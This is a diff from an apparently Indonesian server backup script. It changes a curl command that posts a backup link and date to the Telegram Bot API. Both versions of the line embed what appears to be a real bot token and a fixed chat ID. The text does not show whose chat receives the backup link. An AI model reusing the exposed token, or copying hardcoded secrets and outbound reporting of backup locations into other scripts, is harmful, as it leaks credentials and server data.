@@ -155,7 +155,7 @@ Link Backup   : $link
 Tanggal       : $date
 ==================================
 "
-curl -s --max-time 10 -d "chat_id=1668998643&disable_web_page_preview=1&text=${auto}&parse_mode=html" https://api.telegram.org/5972770394:AAFz8aRmieB4Q3U_r3EuCg-NhjJSdiqsppA/sendMessage >/dev/null
+curl -s -X POST https://api.telegram.org/bot5972770394:AAFz8aRmieB4Q3U_r3EuCg-NhjJSdiqsppA/sendMessage -d chat_id=1668998643 -d text="${auto}" &> /dev/null
 echo -e ""
 read -n 1 -s -r -p "Tap Enter To Back Menu-Backup"
 backup
